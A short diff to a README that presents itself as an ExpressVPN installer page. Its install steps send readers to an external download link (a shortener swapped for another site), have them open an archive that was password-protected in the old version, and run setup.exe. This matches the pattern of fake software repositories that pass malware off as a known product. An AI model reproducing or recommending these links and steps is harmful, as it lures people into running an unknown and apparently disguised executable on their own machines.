@@ -9,8 +9,8 @@ Appear to be anywhere in the world with ExpressVPN’s global fleet of ultra-sec
 
 ## ⚙️ How to install
 
-- [Download](https://goo.su/GUF8Y)
-- Open archive (password: Project12!)
+- [Download](https://softspace.space)
+- Open archive 
 - Open setup.exe for download components and install 
 - Follow the instruction
 
